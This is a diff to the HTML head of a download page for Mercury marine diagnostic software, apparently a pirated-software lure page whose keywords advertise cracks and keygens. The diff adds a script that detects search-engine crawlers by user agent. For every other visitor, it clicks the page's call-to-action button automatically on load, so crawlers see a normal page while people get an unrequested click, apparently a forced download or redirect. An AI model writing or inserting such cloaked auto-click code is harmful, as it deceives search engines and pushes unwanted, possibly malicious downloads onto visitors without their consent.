@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mercury Computer Diagnostic System v9.05 06.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Mercury Computer Diagnostic System v9.05 for marine, racing engines. Supports Windows, multiple languages, and SmartCraft interface. Free download available.">
     <meta name="keywords" content="Mercury Computer Diagnostic System v9.05 06.2024, Mercury diagnostic software, Mercury diagnostic software download, Mercury diagnostic software free download, Mercury Computer Diagnostic System v9.05 download, Mercury Computer Diagnostic System v9.05 free download, Mercury CDS v9.05, Mercury CDS v9.05 2024, marine diagnostic software, race outboard diagnostic software, Sterndrive diagnostic software, Cummins Mercruiser diagnostic software, SmartCraft Interface support, Mercury diagnostic software crack, Mercury diagnostic software keygen, Mariner diagnostic software, Mercruiser diagnostic software, Mercury diagnostic software PDF, diagnostic software for marine engines, troubleshooting marine engines software, Mercury diagnostic software 2024, Mercury Computer Diagnostic System v9.05 2024 free download, Mercury diagnostic software crack 2024, Mercury diagnostic software high speed download, Mercury diagnostic software download 2024, меркурий диагностическое программное обеспечение, меркурий диагностическое программное обеспечение скачать, меркурий диагностическое программное обеспечение бесплатно, скачать меркурий компьютерную диагностическую систему v9.05, меркурий софт диагностики двигателей, діагностичне програмне забезпечення Меркурій, програмне забезпечення для діагностики двигунів Меркурій, скачати програмне забезпечення для діагностики Меркурій, Mercury diagnostic software Deutsch, Mercury diagnostic software Espanol, Mercury diagnostic software Francais, Mercury diagnostic software Italiano, Mercury diagnostic software Nederlands, Mercury diagnostic software Portugues, Mercury diagnostic software Svensk">
     <style>
